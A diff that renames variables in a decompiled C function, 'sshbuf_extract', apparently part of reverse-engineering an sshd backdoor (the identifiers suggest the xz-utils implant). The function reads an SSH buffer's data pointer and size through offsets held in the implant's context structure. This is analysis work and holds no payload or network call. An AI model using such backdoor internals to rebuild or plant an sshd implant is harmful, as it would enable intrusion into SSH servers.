@@ -15,52 +15,52 @@
 BOOL sshbuf_extract(sshbuf *buf,global_context_t *ctx,void **p_sshbuf_d,size_t *p_sshbuf_size)
 
 {
-  byte bVar1;
-  byte bVar2;
-  BOOL BVar3;
-  ulong uVar4;
-  ulong uVar5;
-  u64 uVar6;
-  u8 *addr;
+  byte size_index;
+  byte data_index;
+  BOOL success;
+  ulong size_offset;
+  ulong data_offset;
+  u64 span;
+  u8 *data_ptr;
   
   if (ctx == (global_context_t *)0x0) {
     return FALSE;
   }
   if (((buf != (sshbuf *)0x0) && (p_sshbuf_d != (void **)0x0)) && (p_sshbuf_size != (size_t *)0x0))
   {
-    bVar1 = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 3);
-    bVar2 = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 2);
-    if ((char)(bVar1 & bVar2) < '\0') {
-      uVar4 = 0;
-      uVar5 = 0;
-      uVar6 = 0x48;
+    size_index = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 3);
+    data_index = *(byte *)((long)&(ctx->sshd_offsets).field0_0x0 + 2);
+    if ((char)(size_index & data_index) < '\0') {
+      size_offset = 0;
+      data_offset = 0;
+      span = 0x48;
     }
     else {
-      uVar4 = (ulong)((int)(char)bVar1 << 3);
-      uVar5 = (ulong)((int)(char)bVar2 << 3);
-      uVar6 = uVar4 + 8;
-      if (uVar4 < uVar5) {
-        uVar6 = uVar5 + 8;
+      size_offset = (ulong)((int)(char)size_index << 3);
+      data_offset = (ulong)((int)(char)data_index << 3);
+      span = size_offset + 8;
+      if (size_offset < data_offset) {
+        span = data_offset + 8;
       }
     }
-    BVar3 = is_range_mapped((u8 *)buf,uVar6,ctx);
-    if (BVar3 != FALSE) {
+    success = is_range_mapped((u8 *)buf,span,ctx);
+    if (success != FALSE) {
       if (*(char *)((long)&(ctx->sshd_offsets).field0_0x0 + 2) < '\0') {
-        addr = buf->d;
+        data_ptr = buf->d;
       }
       else {
-        addr = *(u8 **)((long)&buf->d + uVar5);
+        data_ptr = *(u8 **)((long)&buf->d + data_offset);
       }
-      *p_sshbuf_d = addr;
+      *p_sshbuf_d = data_ptr;
       if (*(char *)((long)&(ctx->sshd_offsets).field0_0x0 + 3) < '\0') {
-        uVar6 = buf->size;
+        span = buf->size;
       }
       else {
-        uVar6 = *(u64 *)((long)&buf->d + uVar4);
+        span = *(u64 *)((long)&buf->d + size_offset);
       }
-      *p_sshbuf_size = uVar6;
-      BVar3 = is_range_mapped(addr,uVar6,ctx);
-      return (uint)(BVar3 != FALSE);
+      *p_sshbuf_size = span;
+      success = is_range_mapped(data_ptr,span,ctx);
+      return (uint)(success != FALSE);
     }
   }
   return FALSE;
